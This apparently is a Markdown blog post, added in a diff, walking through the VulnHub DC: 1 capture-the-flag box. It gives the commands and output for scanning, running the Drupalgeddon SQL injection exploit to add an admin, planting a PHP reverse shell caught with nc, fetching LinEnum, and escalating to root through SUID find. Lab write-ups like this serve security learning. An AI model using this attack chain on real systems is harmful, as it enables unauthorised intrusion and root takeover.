@@ -1,0 +1,268 @@
+---
+title: "VulnHub | DC: 1 - Writeup"
+excerpt: Writeup for DC:1 of DC series from VulnHub
+date: 2019-07-09 00:00:00
+categories: [cybersec, infosec, vulnhub]
+tags: [dc, drupal, php, privilege escalation, reverse shell]
+---
+
+## Information
+DC: 1 is the first box on the VulnHub series *DC* by [DCAU][DCAU]. It is relatively easy compared to the other boxes 
+in the series while being quite similar to [Mr. Robot][Mr. Robot] in terms of methodology; getting a reverse shell with 
+PHP while using a SQL injection to do it. There are five flags available but flags 1 through 4 exist to give you hints 
+on what to do next to capture the next flag. As a result, this writeup will only talk about how to capture the root 
+flag only.
+
+## Tasks
+- Capture the root flag
+ 
+## Summary
+- Use `nmap` to see the services
+- Use `droopescan` to see possible version(s) of Drupal
+- Use `searchsploit` to find an exploit on Drupal and use it to gain admin control
+- Implement a reverse shell by posting a new post and use `nc` to catch the reverse shell
+- Spawn a proper shell with `python`
+- Use `LinEnum` to find possible vulnerabilities in the system to escalate current privileges to `root`
+ 
+## Tools Used
+- `nmap`
+- `droopescan`
+- `php-reverse-shell`
+- `nc`
+- `python`
+- `LinEnum`
+- `find`
+
+## Walkthrough
+### nmap
+We begin with a pretty basic `nmap` scan to see what we're dealing with
+
+```
+$ nmap -sC -sV 192.168.2.111
+
+[...]
+
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey:
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-title: Welcome to Drupal Site | Drupal Site
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          42936/tcp  status
+|_  100024  1          43799/udp  status
+MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[...]
+```
+
+We have `SSH` on Port 22, `HTTP` on Port 80 and `RPC` on Port 111.
+
+### HTTP
+Taking a look at the HTTP, we are greeted with a Drupal website.
+
+![Drupal - Homepage][Drupal - Homepage]
+
+Other than a login box, there is nothing helpful here; no version number, posts or such. As a result we'll use 
+`droopescan` to find any info we can on the CMS.
+
+```
+$ pip install droopescan
+
+$ droopescan scan drupal -u 192.168.2.111
+[+] Themes found:                                                               
+    seven http://192.168.2.111/themes/seven/
+    garland http://192.168.2.111/themes/garland/
+
+[+] Possible interesting urls found:
+    Default admin - http://192.168.2.111/user/login
+
+[+] Possible version(s):
+    7.22
+    7.23
+    7.24
+    7.25
+    7.26
+
+[+] Plugins found:
+    ctools http://192.168.2.111/sites/all/modules/ctools/
+        http://192.168.2.111/sites/all/modules/ctools/LICENSE.txt
+        http://192.168.2.111/sites/all/modules/ctools/API.txt
+    views http://192.168.2.111/sites/all/modules/views/
+        http://192.168.2.111/sites/all/modules/views/README.txt
+        http://192.168.2.111/sites/all/modules/views/LICENSE.txt
+    image http://192.168.2.111/modules/image/
+    profile http://192.168.2.111/modules/profile/
+    php http://192.168.2.111/modules/php/
+```
+
+`droopescan` found us several possible versions for Drupal. With that in mind we'll use `searchsploit` to find any 
+known exploits we can use to gain admin access to the page.
+
+```
+$ searchsploit Drupal
+
+------------------------------------------------------------------------------- ----------------------------------------
+Exploit Title                                                                  |  Path
+                                                                               | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------- ----------------------------------------
+[...]
+
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)              | exploits/php/webapps/34992.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)               | exploits/php/webapps/44355.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)    | exploits/php/webapps/34984.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)    | exploits/php/webapps/34993.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)       | exploits/php/webapps/35150.php
+
+[...] 
+------------------------------------------------------------------------------- ----------------------------------------
+```
+
+There are over 40 known exploits regarding Drupal, but the most relevant 6 are displayed above. The most useful among 
+those 6 is `34992`; which adds an admin user via SQL injection. Since our version is `7.2x` this exploit will work on 
+our version of Drupal.
+
+```
+$ wget https://www.exploit-db.com/download/34992
+
+$ python2 34992 -t http://192.168.2.111 -u Arszilla -p password
+
+  ______                          __     _______  _______ _____    
+|   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
+|.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
+|.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
+|:  1    /          |__|                 |   |  |:  1   | |:  |   
+|::.. . /                                |   |  |::.. . | |::.|   
+`------'                                 `---'  `-------' `---'   
+  _______       __     ___       __            __   __             
+|   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
+|   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
+|____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
+|:  1   |  |__|      |:  |    |___|                               
+|::.. . |            |::.|                                        
+`-------'            `---'                                        
+
+[...]
+
+[!] VULNERABLE!
+
+[!] Administrator user created!
+
+[*] Login: Arszilla
+[*] Pass: password
+[*] Url: http://192.168.2.111/?q=node&destination=node
+```
+
+We've added `Arszilla` as an admin user with the password `password`. Once logging in we can see the posts, modules 
+and other admin only content. By accessing `Modules` we can see currently installed modules and in that list we can 
+see `PHP Filter`; which is disabled. After enabling it we edit its permissions it and allow `Administrator` to use it. 
+Now we can go ahead and create a new post where we'll be implementing our reverse shell using [this][PHP Reverse Shell] 
+PHP Reverse Shell script by [pentestmoney][pentestmonkey]. Do note that the text format must be set to `PHP Code` for 
+this to work.
+
+![Drupal - PHP Reverse Shell][Drupal - PHP Reverse Shell]
+
+After creating our new post, we'll spawn `nc` to catch the shell once we visit the post.
+
+```
+$ nc -v -n -l -p 7500
+listening on [any] 7500 ...
+connect to [192.168.2.112] from (UNKNOWN) [192.168.2.111] 59572
+Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
+02:36:16 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ whoami
+www-data
+```
+
+Now that we have a reverse shell, our first task will be to spawn a proper shell and then find any and all 
+vulnerabilities in the system to login as `root` and access `/root`. We'll use `python` to import `pty` to spawn a 
+proper shell and then use [LinEnum][LinEnum] to scan the system.
+
+```
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+
+$ cd /tmp
+cd /tmp
+
+$ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+$ chmod +x LinEnum.sh
+
+$ ./LinEnum.sh
+
+[...]
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+/usr/bin/curl
+
+[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
+
+[...]
+```
+
+`LinEnum` found an interesting `SUID` regarding `find`. A quick research reveals that `find` is vulnerable to `--exec` 
+attack where an attacker can spawn a shell where they are `root`.
+
+```
+$ find /etc/passwd -exec /bin/sh \;
+
+$ whoami
+root
+
+$ cd /root
+
+$ ls -la
+total 32
+drwx------  4 root root 4096 Feb 28 12:11 .
+drwxr-xr-x 23 root root 4096 Feb 19 22:34 ..
+drwx------  2 root root 4096 Feb 19 22:30 .aptitude
+-rw-------  1 root root   44 Feb 28 12:11 .bash_history
+-rw-r--r--  1 root root  949 Feb 19 23:03 .bashrc
+drwxr-xr-x  3 root root 4096 Feb 19 23:03 .drush
+-rw-r--r--  1 root root  140 Nov 20  2007 .profile
+-rw-r--r--  1 root root  173 Feb 19 23:43 thefinalflag.txt
+
+$ cat thefinalflag.txt
+Well done!!!!
+
+
+Hopefully you've enjoyed this and learned some new skills.
+
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+```
+
+Thus, we've gained captured the `root` flag in DC: 1.
+
+[DCAU]:                         https://twitter.com/DCAU7
+[Mr. Robot]:                    https://www.vulnhub.com/entry/mr-robot-1,151/
+[Drupal - Homepage]:            /images/posts/2019-07-09-vulnhub-dc_1/Drupal%20-%20Homepage.png
+[PHP Reverse Shell]:            http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+[pentestmonkey]:                http://pentestmonkey.net/
+[Drupal - PHP Reverse Shell]:   /images/posts/2019-07-09-vulnhub-dc_1/Drupal%20-%20PHP%20Reverse%20Shell.png
+[LinEnum]:                      https://github.com/rebootuser/LinEnum
